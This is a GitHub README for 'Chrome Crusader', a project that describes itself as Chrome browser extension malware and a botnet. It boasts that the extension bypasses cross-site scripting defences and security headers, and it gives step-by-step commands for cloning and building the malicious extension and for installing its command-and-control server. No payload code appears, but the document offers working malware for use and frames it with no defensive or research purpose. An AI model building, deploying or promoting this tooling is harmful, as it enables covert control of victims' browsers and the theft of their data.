[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://github.com/lillypad/chrome-crusader/blob/master/LICENSE)
[![Python 2](https://img.shields.io/badge/Python-2-brightgreen.svg)](https://github.com/lillypad/chrome-crusader/)
[![Python 3](https://img.shields.io/badge/Python-3-brightgreen.svg)](https://github.com/lillypad/chrome-crusader/)
[![PyPI](https://img.shields.io/pypi/v/nine.svg)](https://github.com/lillypad/chrome-crusader/)

# Chrome Crusader

Chrome Crusader is a Google Chrome browser extension malware / botnet.

<p align="center">
<img src="https://github.com/lillypad/chrome-crusader/raw/master/docs/presentation/img/chrome_pony_evil.png" alt="Chrome Crusader" width="415px" height="398px">
</p>

# Interesting Facts

In the words of Google:

> When writing a content script, you should be aware of two security issues. First, be careful not to introduce security vulnerabilities into the web site your content script is injected into. For example, if your content script receives content from another web site (for example, by making an XMLHttpRequest), be careful to filter that content for cross-site scripting attacks before injecting the content into the current page. For example, prefer to inject content via innerText rather than innerHTML. Be especially careful when retrieving HTTP content on an HTTPS page because the HTTP content might have been corrupted by a network "man-in-the-middle" if the user is on a hostile network.

:trollface: It's so easy to bypass cross-site scripting and security headers in this malware anyone can do it :trollface:

# Screenshots
![[Chrome Crusader](img/screenshot_0.png)

# Building Chrome Crusader

**Download Source**
```bash
git clone https://github.com/lillypad/chrome-crusader.git
cd chrome-crusader/
```

**Building Chrome Extension**
```bash
./configure.sh
make chrome
```

**Building Chromium Extension**
```bash
./configure.sh
make chromium
```

**Building Documents**
```bash
make docs
```

**Installing CnC Server**
```bash
cd cnc-server/
sudo python setup.py install
ccserver.py
```

# Disclaimer

By using this free software you indemnify and hold harmless it's creators and understand you are using this at your own risk.
